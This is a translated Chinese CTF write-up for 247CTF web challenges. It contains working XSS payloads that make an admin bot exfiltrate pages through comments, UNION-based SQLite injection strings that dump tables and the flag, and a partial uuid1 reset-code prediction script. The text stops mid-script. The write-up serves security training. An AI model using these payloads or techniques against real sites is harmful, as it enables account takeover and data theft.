# 247CTF的9个web题目分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
最近朋友推荐几个web题目，都是这个平台的，感觉有些题目还不错，web有十个，有一个要用机器学习识别验证码，就没搞，就写了九个，还是学到了一些骚思路的，还是太菜了
地址
## HELICOPTER ADMINISTRATORS——Hard
###  考点
  * 从XSS入手，利用SSRF去访问后端的一个有SQLite注入的查询服务
  * XSS=>SSRF=>SQLite注入
###  描述
This applications administrators are very aggressive. They will immediately
view any page you report. Can you trick them into disclosing data they
shouldn’t?
###  题目分析
打开靶机发现有三个用户是可以查看的，不能查看Admin
在每个用户页面有两个功能，一个是`Comment`，用来留言，另一个是`Report`，用来向后端的bot提交页面，因为题目描述中说了`They will
immediately view any page you
report.`，所以这大概率是个XSS。直接提交``发现是被ban掉的，试了一下发现ban掉了`svg`、`alert`等等
可以用``和`atob`函数去bypass，``
成功XSS，但是还是访问不了Admin。于是尝试一下bot是否可以访问其他用户
payload
    var xhr = new XMLHttpRequest();
    xhr.open("POST","/comment/2",true);
    var params = "comment=hacked";
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(params);
在user2发现了两个hacked，一次是提交comment之后自动刷新造成的，一次是bot访问造成的
也就是说，可以利用XSS去访问Admin，然后将结果返回到其它用户的comment处
    var xhr = new XMLHttpRequest();
    var xhr2 = new XMLHttpRequest();
    xhr.open("GET", "/user/0", true);
    xhr.send();
    xhr.onload = function(){
    var responsefrompage = xhr.response;
    xhr2.open("POST","/comment/2",true);
    var params = "comment=" + encodeURI(btoa(responsefrompage));
    xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr2.send(params);}
然后可以在user2处看到返回的经过base64编码的html，解码之后就是原来的页面。
不难在返回的html中发现，有个form表单，提交的地址是`/secret_admin_search`，是一个查找的功能，那这里可能会有注入
直接访问会提示不是Admin，并且是json格式的数据
就还要利用上面的方式，将结果输出到其它用户的comment处
    var xhr = new XMLHttpRequest();
    var xhr2 = new XMLHttpRequest();
    xhr.open("POST", "/secret_admin_search", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    var parameters = "search=" + encodeURI(";'");
    xhr.send(parameters);
    xhr.onload = function(){
    var responsefrompage = xhr.response;
    xhr2.open("POST","/comment/3",true);
    var params = "comment=" + encodeURI(btoa(responsefrompage));
    xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr2.send(params);}
返回结果解码之后是SQLite的报第一个错误，把SQL语句改成`1' union select 1,2,3--`报第二个错误，那就说明可能是数字型注入。
用`1 union select 1,2,3--`返回的是列错误，说明是数字型，并且列数不是3，测试了一下，列是6
    {"message":"SQLite error: near \";\": syntax error","result":"error"}
    {"message":"SQLite error: unrecognized token: \"' union select 1,2,3--\"","result":"error"}
    {"message":"SQLite error: SELECTs to the left and right of UNION do not have the same number of result columns","result":"error"}
    var xhr = new XMLHttpRequest();
    var xhr2 = new XMLHttpRequest();
    xhr.open("POST", "/secret_admin_search", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    var parameters = "search=" + encodeURI("1 union select 1,2,3,4,5,6--");
    xhr.send(parameters);
    xhr.onload = function(){
    var responsefrompage = xhr.response;
    xhr2.open("POST","/comment/3",true);
    var params = "comment=" + encodeURI(btoa(responsefrompage));
    xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr2.send(params);}
得到结果
    {"message":[[1,2,3,4,5,6],[1,"Michael Owens",14,22,3,"Sydney, Australia"]],"result":"success"}
然后就可以去联合注入了，可以看到flag在flag表中的flag字段
    0 union select 1,2,3,4,name,sql from sqlite_master where type='table'--    
    {"message":[[0,"Administrator",100,100,100,"New York, USA"],[1,2,3,4,"comment","CREATE TABLE comment (id int, comment text)"],[1,2,3,4,"flag","CREATE TABLE flag (flag text)"],[1,2,3,4,"user","CREATE TABLE user (id int primary key, name text, friends int, likes int, shares int, location text)"]],"result":"success"}
直接用`-1 union select 1,2,3,4,5,flag from flag--`就可以了
    var xhr = new XMLHttpRequest();
    var xhr2 = new XMLHttpRequest();
    xhr.open("POST", "/secret_admin_search", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    var parameters = "search=" + encodeURI("-1 union select 1,2,3,4,5,flag from flag--");
    xhr.send(parameters);
    xhr.onload = function(){
    var responsefrompage = xhr.response;
    xhr2.open("POST","/comment/3",true);
    var params = "comment=" + encodeURI(btoa(responsefrompage));
    xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr2.send(params);}
结果
    {"message":[[1,2,3,4,5,"247CTF{c9355024736f1fdfa121e243c7024540}"]],"result":"success"}
## ADMINISTRATIVE ORM——Hard
###  考点
  * Flask代码审计
  * uuid1()分析
###  描述
We started building a custom ORM for user management. Can you find any bugs
before we push to production?
###  题目分析
前面几行是对Flask和ORM的初始化。初始化USER为`admin`
    import pymysql.cursors
    import pymysql, os, bcrypt, debug
    from flask import Flask, request
    from secret import flag, secret_key, sql_user, sql_password, sql_database, sql_host
    class ORM():
        def __init__(self):
            self.connection = pymysql.connect(host=sql_host, user=sql_user, password=sql_password, db=sql_database, cursorclass=pymysql.cursors.DictCursor)
            # ......
    app = Flask(__name__)
    app.config['DEBUG'] = False
    app.config['SECRET_KEY'] = secret_key
    app.config['USER'] = 'admin'
跟着路由走，在第一次访问之前，会初始化一个ORM对象，然后给admin设置一个随机密码，并用hash加盐加密
    @app.before_first_request
    def before_first():
        app.config['ORM'] = ORM()
        app.config['ORM'].set_password(app.config['USER'], os.urandom(32).hex())
    class ORM():
        def __init__(self):
            # ......
        def set_password(self, user, password):
            password_hash = bcrypt.hashpw(password, bcrypt.gensalt())
            self.update('update users set password=%s where username=%s', (password_hash, user))
然后来到主页，返回题目源码
    @app.route('/')
    def source():
        return "
    %s
    " % open(__file__).read()
访问`/statistics`会返回一些debug数据，这里出现`clock_seq`和`last_reset`的条件是先用错误的`reset_code`去访问`/update_password`，例如`/update_password?reset_code=13814000-1dd2-11b2-8000-0242ac110005&password=123456`
    @app.route("/statistics") # TODO: remove statistics
    def statistics():
        return debug.statistics()
访问`/update_password`，要GET传参`reset_code`，要这个`reset_code`存在才可以修改密码，而它是由python的`uuid()`函数生成
    @app.route("/update_password")
    def update_password():
        user_row = app.config['ORM'].get_by_reset_code(request.args.get('reset_code',''))
        if user_row:
            app.config['ORM'].set_password(app.config['USER'], request.args.get('password','').encode('utf8'))
            return "Password reset for %s!" % app.config['USER']
        app.config['ORM'].set_reset_code(app.config['USER'])
        return "Invalid reset code for %s!" % app.config['USER']
    class ORM():
        def get_by_reset_code(self, reset_code):
            return self.query('select * from users where reset_code=%s', reset_code)
        def set_reset_code(self, user):
            self.update('update users set reset_code=uuid() where username=%s', user)
`/get_flag`是获取flag的逻辑，要输入的`password`和上面随机生成的相同才可以返回flag
    @app.route("/get_flag")
    def get_flag():
        user_row = app.config['ORM'].get_by_name(app.config['USER'])
        if bcrypt.checkpw(request.args.get('password','').encode('utf8'), user_row['password'].encode('utf8')):
            return flag
        return "Invalid password for %s!" % app.config['USER']
    class ORM():
        def get_by_name(self, user):
            return self.query('select * from users where username=%s', user)
这里用`uuid()`生成`reset_code`，那就去分析代码，看一下生成的条件
python中`uuid.uuid1()`的分析，将其中比较关键的逻辑拿出来看一看
发现需要三个参数，默认参数`node`为`None`是MAC地址的十进制数，`clock_seq`为`None`是一个随机生成的数字，`timestamp`为从
[epoch](https://docs.python.org/zh-cn/3/library/time.html#epoch)
开始的纳秒数，也就是`time.time()`乘以10的9次方。不过要注意的是，题目的时间是`GMT`的，比本地时间(北京时间)的时间戳多了`28800`秒
    def uuid1(node=None, clock_seq=None):
        # ...
        import time
        nanoseconds = time.time_ns()
        timestamp = nanoseconds // 100 + 0x01b21dd213814000
        # ...
        time_low = timestamp & 0xffffffff
        time_mid = (timestamp >> 32) & 0xffff
        time_hi_version = (timestamp >> 48) & 0x0fff
        clock_seq_low = clock_seq & 0xff
        clock_seq_hi_variant = (clock_seq >> 8) & 0x3f
        # ...
        return UUID(fields=(time_low, time_mid, time_hi_version,
                            clock_seq_hi_variant, clock_seq_low, node), version=1)
最终生成`uuid`的代码
    import time
    import uuid
    from decimal import *
    def mac2int(mac):
        return int(mac.replace(':', ''), 16)
    def time2ns(time_str):
        dt,ns = time_str.split(".")
        timeArray = time.strptime(dt, "%Y-%m-%d %H:%M:%S")
        timestamp = time.mktime(timeArray)
        timestamp = int(timestamp)+28800
        timestamp = str(timestamp)+'.'+str(ns)
        return int(Decimal(timestamp)*1000*1000*1000)
    def uuid1(node, clock_seq, ts):
        timestamp = ts // 100 + 0x01b21dd213814000
        time_low = timestamp & 0xffffffff
        time_mid = (timestamp >> 32) & 0xffff